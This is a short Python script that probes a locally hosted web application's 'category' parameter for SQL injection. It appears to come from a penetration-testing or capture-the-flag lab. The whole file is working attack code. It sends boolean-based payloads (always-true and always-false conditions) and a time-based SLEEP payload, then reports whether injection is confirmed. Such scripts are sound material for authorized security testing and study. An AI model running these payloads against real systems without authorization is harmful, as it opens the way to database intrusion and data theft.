# Objective and context
import requests
import urllib.parse
import time

target = "http://127.0.0.1:32780/"

# Test for blind SQL injection with conditional responses
def test_blind_sqli():
    print("Testing blind SQL injection on category parameter...")
    
    # True condition - should return normal page with categories
    payload_true = "Nature' AND '1'='1"
    print(f"\nTesting TRUE condition: {payload_true}")
    r_true = requests.get(f"{target}?category={payload_true}")
    print(f"Status: {r_true.status_code}, Size: {len(r_true.text)}")
    
    # False condition - should show "Category does not exist"
    payload_false = "Nature' AND '1'='2"
    print(f"\nTesting FALSE condition: {payload_false}")
    r_false = requests.get(f"{target}?category={payload_false}")
    print(f"Status: {r_false.status_code}, Size: {len(r_false.text)}")
    
    # Check if response differs
    if "does not exist" in r_false.text and "does not exist" not in r_true.text:
        print("\n[+] BLIND SQL INJECTION CONFIRMED!")
        print("True condition returns categories, false condition returns 'does not exist'")
        return True
    else:
        print("\n[-] No observable difference in responses")
        return False

# Test for time-based blind SQL injection
def test_timebased_sqli():
    print("\n\nTesting time-based blind SQL injection...")
    
    # Time delay if condition is true
    payload_time = "Nature' AND SLEEP(3)--"
    print(f"Testing: {payload_time}")
    
    start = time.time()
    r = requests.get(f"{target}?category={payload_time}", timeout=10)
    elapsed = time.time() - start
    
    print(f"Response time: {elapsed:.2f} seconds")
    if elapsed > 2.5:
        print("[+] TIME-BASED SQL INJECTION CONFIRMED!")
        return True
    else:
        print("[-] No time delay detected")
        return False

test_blind_sqli()
test_timebased_sqli()

